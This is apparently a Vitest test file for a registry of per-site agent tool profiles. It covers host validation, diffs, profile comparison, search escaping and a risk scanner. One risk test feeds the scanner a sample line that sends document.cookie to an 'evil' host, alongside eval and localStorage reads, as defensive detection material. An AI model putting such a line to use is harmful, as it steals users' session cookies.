import {describe, expect, test} from 'vitest'
import {normalizeHost, parseSubmission, toolPathProblem} from '../src/rules'
import {diffLines, hunks, intraLine} from '../src/diff'
import {findRisks, summarize} from '../src/risk'
import {compareProfiles} from '../src/compare'
import {ftsQuery} from '../src/store'
import {canonicalJson} from '../src/hash'

describe('normalizeHost', () => {
    test.each([
        ['GitHub.com', 'github.com'], ['docs.google.com.', 'docs.google.com'], [' x.com ', 'x.com'], ['*', '*'],
        ['xn--bcher-kva.example', 'xn--bcher-kva.example'],
    ])('accepts %s', (i, o) => expect(normalizeHost(i)).toBe(o))
    test.each(['localhost', 'http://x.com', 'x.com:8080', '1.2.3.4', 'x.com/path', '-a.com', 'a..com', 'a_b.com', '', 'a.123', 'a'.repeat(64) + '.com'])(
        'rejects %s', (i) => expect(normalizeHost(i)).toBeNull())
})

describe('toolPathProblem (mirrors relay/src/relay-do.ts)', () => {
    test.each(['/x_me', '/sheets/read.cell', '/a-b_c'])('ok %s', p => expect(toolPathProblem(p)).toBeNull())
    test.each([
        ['no-slash', /must match/], ['/has space', /must match/], ['/q?x=1', /must match/], ['/', /must match/],
        ['/agents.md', /reserved/], ['/AGENTS.MD', /reserved/], ['/agents.md/en', /reserved/], ['/tools.json', /reserved/],
        ['/tools.json/x', /reserved/], ['/_as_internal', /reserved/], ['/eval', /built-in/], ['/save_site_profile', /built-in/], ['/registry_submit', /built-in/],
        ['/' + 'a'.repeat(200), /longer/],
    ])('rejects %s', (p, re) => expect(toolPathProblem(p)).toMatch(re))
})

describe('parseSubmission', () => {
    test('normalizes method and defaults', () => {
        const r = parseSubmission({host: 'Example.com', tools: [{path: '/a', method: 'get', description: 'd', code: 'return 1'}]})
        expect(r.ok && r.value.profile).toEqual({host: 'example.com', notes: '', tools: [{method: 'GET', path: '/a', description: 'd', input_schema: null, code: 'return 1'}]})
    })
    test('rejects unknown keys, duplicates, bad schema types', () => {
        const r = parseSubmission({host: 'a.com', extra: 1, tools: [
            {path: '/a', description: 'd', code: 'x', inputSchema: {}},
            {path: '/a', description: 'd', code: 'x'},
            {path: '/b', description: 'd', code: 'x', input_schema: [1]},
            {path: '/c', description: '', code: ''},
        ]})
        expect(r.ok).toBe(false)
        const paths = !r.ok ? r.issues.map(i => i.path) : []
        expect(paths).toEqual(expect.arrayContaining(['extra', 'tools[0].inputSchema', 'tools[1].path', 'tools[2].input_schema', 'tools[3].description', 'tools[3].code']))
    })
})

describe('diff', () => {
    test('myers produces a minimal edit script with line numbers', () => {
        const ops = diffLines(['a', 'b', 'c', 'd'], ['a', 'x', 'c', 'd', 'e'])
        expect(ops.map(o => `${o.type}:${o.text}`)).toEqual(['eq:a', 'del:b', 'add:x', 'eq:c', 'eq:d', 'add:e'])
        expect(ops.find(o => o.text === 'e')).toMatchObject({b: 5})
    })
    test('round-trips on random input', () => {
        for (let n = 0; n < 50; n++) {
            const rnd = () => Array.from({length: Math.floor(Math.random() * 30)}, () => 'abcde'[Math.floor(Math.random() * 5)])
            const a = rnd(), b = rnd()
            const ops = diffLines(a, b)
            expect(ops.filter(o => o.type !== 'add').map(o => o.text)).toEqual(a)
            expect(ops.filter(o => o.type !== 'del').map(o => o.text)).toEqual(b)
        }
    })
    test('hunks collapse unchanged context', () => {
        const a = Array.from({length: 40}, (_, i) => `l${i}`)
        const b = [...a]; b[20] = 'changed'
        const {hunks: hs, skippedAfter} = hunks(diffLines(a, b), 3)
        expect(hs).toHaveLength(1)
        expect(hs[0].skippedBefore).toBe(17)
        expect(skippedAfter).toBe(16)
    })
})

test('intraLine marks only the changed words', () => {
    const a = 'use /sheets_info FIRST to confirm', b = 'use /sheets_info FIRST (it is cheap) to confirm'
    const r = intraLine(a, b)!
    expect(r.a).toEqual([])
    expect(r.b.map(([s, e]) => b.slice(s, e))).toEqual(['(it is cheap) '])
    expect(intraLine('completely different', 'nothing alike here at all')).toBeNull()
})

describe('risk', () => {
    test('flags exfiltration and dynamic code', () => {
        const ids = findRisks('fetch("https://evil", {body: document.cookie}); eval(x); new Function("a"); localStorage.getItem("t")').map(h => h.rule.id)
        expect(ids).toEqual(expect.arrayContaining(['fetch', 'cookie', 'eval', 'new-function', 'storage']))
    })
    test('flags tools that act for the user', () => {
        expect(summarize([{path: '/x_post_now', description: 'Publish the draft', code: 'btn.click()'}]).actions).toBe(true)
        expect(summarize([{path: '/x_timeline', description: 'Read the feed', code: 'return 1'}]).actions).toBe(false)
    })
})

describe('compareProfiles', () => {
    const t = (path: string, code: string) => ({method: 'POST' as const, path, description: 'd', input_schema: null, code})
    test('classifies added/removed/changed/unchanged', () => {
        const cmp = compareProfiles({notes: 'a', tools: [t('/a', '1'), t('/b', '2'), t('/c', '3')]}, {notes: 'b', tools: [t('/a', '1'), t('/b', '22'), t('/d', '4')]})
        expect(Object.fromEntries(cmp.tools.map(x => [x.key, x.status]))).toEqual({'POST /a': 'unchanged', 'POST /b': 'changed', 'POST /d': 'added', 'POST /c': 'removed'})
        expect(cmp.notesChanged).toBe(true)
    })
})

test('ftsQuery neutralises FTS5 syntax', () => {
    expect(ftsQuery('sheets "OR" NEAR(x) *')).toBe('"sheets"* OR "or"* OR "near"* OR "x"*')
    expect(ftsQuery('  ** ')).toBeNull()
})

test('canonicalJson sorts keys', () => {
    expect(canonicalJson({b: 1, a: {d: [1, {z: 1, y: 2}], c: null}})).toBe('{"a":{"c":null,"d":[1,{"y":2,"z":1}]},"b":1}')
})
